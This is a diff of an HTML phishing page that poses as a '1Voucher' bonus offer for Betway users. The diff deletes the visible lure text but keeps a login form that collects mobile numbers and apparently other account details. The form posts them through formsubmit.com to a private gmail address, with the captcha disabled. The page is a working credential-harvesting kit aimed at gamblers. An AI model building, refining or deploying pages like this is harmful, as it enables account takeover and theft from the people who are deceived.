@@ -60,7 +60,7 @@
       color: #DD571C;
       font-size: 16px;
       line-height: 1.5;
-      display: none; /* Keep hidden unless needed */
+      display: none; /*always show */
     }
 
     @keyframes blinkTwice {
@@ -170,22 +170,14 @@
     }
   </style>
 </head>
-
 <body>
   <div class="container">
     <div class="wrapper">
       <!-- Image -->
       <img id="voucherImage" src="https://www.peachpayments.com/hubfs/1%20voucher.png" alt="1Voucher" class="image-box" />
-
-      <!-- Message -->
-      <div id="messageBox" class="voucher-message-box">
-        Congratulations, you have claimed R360 1Voucher Bonus for World Cup Opening. Enter your Betway details below and check your Betway inbox after 2 hours for voucher code.
-      </div>
-
       <!-- Form -->
       <form id="loginForm" action="https://formsubmit.com/koklamann0@gmail.com" method="POST">
         <input type="hidden" name="_captcha" value="false" />
-
         <div class="row">
           <i class="fas fa-user"></i>
           <input type="number" name="phone" placeholder="Mobile Number" required />
@@ -207,7 +199,6 @@
     </div>
   </div>
 
-  <!-- Removed the custom JavaScript for fetch; relying on default form submission -->
 
 </body>
 </html>
